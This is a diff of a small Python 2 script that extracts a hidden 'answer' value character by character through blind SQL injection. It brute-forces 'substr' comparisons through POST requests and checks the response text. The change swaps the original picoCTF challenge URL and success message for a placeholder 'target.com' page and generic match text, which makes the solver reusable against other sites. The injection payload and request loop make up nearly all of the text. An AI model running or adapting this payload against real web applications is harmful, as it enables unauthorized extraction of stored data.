@@ -21,8 +21,8 @@ def findNextLetter(num):
   	#Uppercase alphabet
 	for one in range(65,91):
 		payload = '''blah' OR substr(answer,''' + str(num) + ''',1)=\'''' + chr(one) + '''\';'''
-		post = requests.post('http://2018shell3.picoctf.com:36052/answer2.php', data = {'answer':payload})
-		match = re.findall("You are so close.",post.text)
+		post = requests.post('http://www.target.com/page.php', data = {'answer':payload})
+		match = re.findall("This text means it failed",post.text)
 		if(match):
 			print chr(one)
 
@@ -30,8 +30,8 @@ def findNextLetter(num):
 	#Lowercase alphabet
 	for one in range(97,123):
 		payload = '''blah' OR substr(answer,''' + str(num) + ''',1)=\'''' + chr(one) + '''\';'''
-		post = requests.post('http://2018shell3.picoctf.com:36052/answer2.php', data = {'answer':payload})
-		match = re.findall("You are so close.",post.text)
+		post = requests.post('http://www.target.com/page.php', data = {'answer':payload})
+		match = re.findall("This text means it failed",post.text)
 		if(match):
 			print chr(one)
 
